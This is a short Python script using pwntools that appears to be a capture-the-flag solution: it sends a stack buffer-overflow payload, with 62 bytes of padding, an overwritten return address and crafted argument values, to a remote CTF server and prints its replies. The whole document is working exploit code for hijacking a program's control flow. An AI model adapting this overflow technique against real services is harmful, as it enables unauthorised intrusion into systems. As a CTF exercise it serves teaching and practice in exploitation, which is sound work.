from pwn import *

payload = "A"*62+"\x82\x91\x04\x08"+"\x6e\x01\x00\x00"+"\xb0\x04\x00\x00"+"\x6e\x01\x00\x00"


p = remote('ctf.umbccd.io', 4000)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.sendline("A")
print(p.recvline())
